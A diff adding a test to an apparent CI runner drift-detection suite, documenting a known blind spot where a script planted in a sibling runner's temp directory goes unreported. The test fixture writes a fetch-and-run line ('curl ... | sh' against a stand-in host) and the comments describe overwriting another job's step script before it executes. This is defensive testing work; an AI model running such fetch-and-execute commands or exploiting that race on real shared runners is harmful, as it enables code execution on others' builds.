@@ -861,6 +861,48 @@ describe("AC-8 (#866/#871): the runtime's own directories are subtracted", () =>
       expect(r.stderr, "the refusal does not name the _tempest write").toContain(target);
     });
 
+    test("AC-15h (#897): THE BLIND SPOT — a planted .sh in a sibling's _work/_temp is NOT reported", () => {
+      // This case asserts a WEAKNESS, deliberately, so that it is visible
+      // rather than silent. Raised by the automated security review of this
+      // branch's first push, whose point stands: `_diag` holds logs that are
+      // never executed, `_work/_temp` is where the runner writes `<uuid>.sh`
+      // and immediately execs it. Subtracting it means a reviewer that
+      // overwrites a sibling's step script in the window between write and
+      // exec is not reported. Narrow, but real, on a shared home.
+      //
+      // It is accepted because the alternative measured worse: before the
+      // subtraction the check was red on every PR (1 success in 8 runs, and
+      // that one predates the pool), so it reported nothing anybody read.
+      //
+      // Both narrowings suggested in review restore that red, because the
+      // measured noise IS `.sh` files in a sibling's `_temp`: scoping to this
+      // job's own $RUNNER_TEMP still reports runner-4's three paths (the job
+      // ran on runner-5), and keeping `*.sh` reportable reports all three by
+      // name. There is no path-shaped discriminator — same uid, same filename
+      // shape, same directory, and `-newer` is satisfied by both.
+      //
+      // The structural fix is a per-runner HOME, which deletes this case
+      // along with the rest of the list. When that lands, DELETE this test —
+      // do not relax it.
+      const f = fixture();
+      const { path, sha } = runBaseline(f);
+      const planted = join(f.home, "runner-4", "_work", "_temp", "9f1c0e7a-dead-beef-cafe-000000000001.sh");
+      mkdirSync(join(planted, ".."), { recursive: true });
+      writeFileSync(planted, "#!/bin/sh\ncurl -s https://example.invalid/x | sh\n", { mode: 0o755 });
+      const r = runDrift(f, path, sha);
+      // Non-vacuity: the drift reading has to be WORKING for "it said nothing"
+      // to mean "it is blind here" rather than "it never ran". The same run
+      // must still refuse an ordinary escaped write.
+      const escaped = join(f.home, "escaped.sh");
+      writeFileSync(escaped, "#!/bin/sh\necho owned\n");
+      const r2 = runDrift(f, path, sha);
+      expect(r2.code, "the reading is not working at all, so this case measures nothing").not.toBe(0);
+      expect(r2.stderr, "the control write was not named").toContain(escaped);
+
+      expect(r.code, "the blind spot has CLOSED — delete this case and update the docblock").toBe(0);
+      expect(r.stdout + r.stderr, "the planted script was named after all").not.toContain(planted);
+    });
+
     test("AC-15e: the subtraction is emitted from the declared list, not typed", () => {
       // One emitter, and the clause the script carries is the one the
       // emitter returns — not a second copy that happens to agree.
